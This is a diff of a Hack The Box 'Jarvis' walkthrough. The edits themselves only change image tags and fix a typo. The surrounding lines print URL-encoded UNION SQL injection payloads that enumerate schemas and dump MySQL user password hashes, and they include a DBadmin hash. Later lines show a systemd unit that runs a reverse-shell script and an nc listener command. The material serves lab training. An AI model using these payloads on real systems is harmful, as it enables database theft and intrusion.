@@ -97,15 +97,15 @@ We can assume that the query calls certain portions of the results that are show
 
 Let's start with 5 columns, or `cod=99999+union+select+1,2,3,4,5`.
 
-![](/assets/htb-jarvis/sqli_5col.png)
+<a href="/assets/htb-jarvis/sqli_5col.png"><img src="/assets/htb-jarvis/sqli_5col.png" width="95%"></a>
 
 Let's move to 6 columns, or `cod=99999+union+select+1,2,3,4,5,6`.
 
-![](/assets/htb-jarvis/sqli_6col.png)
+<a href="/assets/htb-jarvis/sqli_6col.png"><img src="/assets/htb-jarvis/sqli_6col.png" width="95%"></a>
 
 ...and 7 columns, or `cod=99999+union+select+1,2,3,4,5,6,7`?
 
-![](/assets/htb-jarvis/sqli_7col.png)
+<a href="/assets/htb-jarvis/sqli_7col.png"><img src="/assets/htb-jarvis/sqli_7col.png" width="95%"></a>
 
 So we now get results back with 7 columns in the select statement. This means that the table we're pulling from has 7 columns. The numbers in the select statement relate to their position in the results. So for example, column 3 relates to the price, 5 is the rating, and 2 looks to be the room image. If you plug the full URL, plus the injection into a browser, you can see it easier.
 
@@ -115,7 +115,7 @@ So we now get results back with 7 columns in the select statement. This means th
 
 Now that we've got a PoC for the SQLi, we can start pulling data from the database. A good starting point is the `select @@version` command, which will tell us the version of the DB server running, and helps us validate that we have code execution at the db level. The SQLi in this case would be `cod=99999+union+select+1,2,(select+%40%40version),4,5,6,7`. Again, note the URL encoding.
 
-![](/assets/htb-jarvis/sqli_version.png)
+<a href="/assets/htb-jarvis/sqli_version.png"><img src="/assets/htb-jarvis/sqli_version.png" width="95%"></a>
 
 It looks like we're looking at MariaDB, version 10.1.37. Let's keep grabbing data. [This resource is great](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for MySQL enumeration.
 
@@ -133,7 +133,7 @@ URL-encoded Parameter:
 cod=99999+union+select+"1","2",(select+schema_name+FROM+information_schema.schemata),"4","5","6","7"
 ```
 
-![](/assets/htb-jarvis/schemata_blank.png)
+<a href="/assets/htb-jarvis/schemata_blank.png"><img src="/assets/htb-jarvis/schemata_blank.png" width="95%"></a>
 
 However, if we add the `LIMIT 1` clause to our query, we get a response of `hotel`. This is because we can currently only display one line at a time. The `LIMIT 1` query cuts our responses off at the first result, allowing it to be displayed.
 
@@ -149,7 +149,7 @@ URL-encoded Parameter:
 cod=99999+union+select+"1","2",(select+schema_name+FROM+information_schema.schemata+limit+1),"4","5","6","7"
 ```
 
-![](/assets/htb-jarvis/schemata_limit1.png)
+<a href="/assets/htb-jarvis/schemata_limit1.png"><img src="/assets/htb-jarvis/schemata_limit1.png" width="95%"></a>
 
 We can get around this limitation by using the `GROUP_CONCAT()` function to display our results in a single line. 
 
@@ -165,7 +165,7 @@ URL-encoded Parameter:
 cod=99999+union+select+"1","2",(select+group_concat(schema_name,"%3a")+FROM+information_schema.schemata),"4","5","6","7"
 ```
 
-![](/assets/htb-jarvis/schemata_group_concat.png)
+<a href="/assets/htb-jarvis/schemata_group_concat.png"><img src="/assets/htb-jarvis/schemata_group_concat.png" width="95%"></a>
 
 Now that we have a way to return multiple items, we can try to pull usernames and password hashes from MySQL.
 
@@ -181,7 +181,7 @@ URL-encoded Parameter:
 cod=99999+union+select+"1","2",(SELECT+group_concat(user,"%3b",password,"%3b")+FROM+mysql.user),"4","5","6","7"
 ```
 
-![](/assets/htb-jarvis/mysql_passwordhash.png)
+<a href="/assets/htb-jarvis/mysql_passwordhash.png"><img src="/assets/htb-jarvis/mysql_passwordhash.png" width="95%"></a>
 
 This gives us a password hash of `2D2B7A5E4E637B8FBA1D17F40318F277D29964D0` for the `DBadmin` user. We can feed this hash into `hashcat` to crack it.
 
@@ -473,7 +473,7 @@ ExecStart=/bin/bash /tmp/revshell.sh
 WantedBy=multi-user.target
 ```
 
-NOtice how it's calling the `revshell.sh` script we created to exploit `simpler.py`. Since we're using SSH here, we can resuse it again.
+Notice how it's calling the `revshell.sh` script we created to exploit `simpler.py`. Since we're using SSH here, we can resuse it again.
 
 > Start a listener with `nc -lvnp 7600`
 
